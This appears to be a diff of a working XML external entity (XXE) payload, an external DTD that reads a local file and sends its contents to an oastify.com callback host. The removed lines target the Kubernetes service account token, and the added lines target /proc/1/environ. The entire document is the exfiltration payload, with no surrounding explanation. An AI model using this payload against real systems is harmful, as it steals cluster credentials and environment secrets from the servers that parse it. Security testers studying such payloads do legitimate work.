@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://wrrgnl3bjajb1ps5dpk66hhwzn5et4ht.oastify.com/?exf-host=%file;'>">
+<!ENTITY % file SYSTEM "file:///proc/1/environ">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://wrrgnl3bjajb1ps5dpk66hhwzn5et4ht.oastify.com/?exf=%file;'>">
 %eval;
 %exfil;
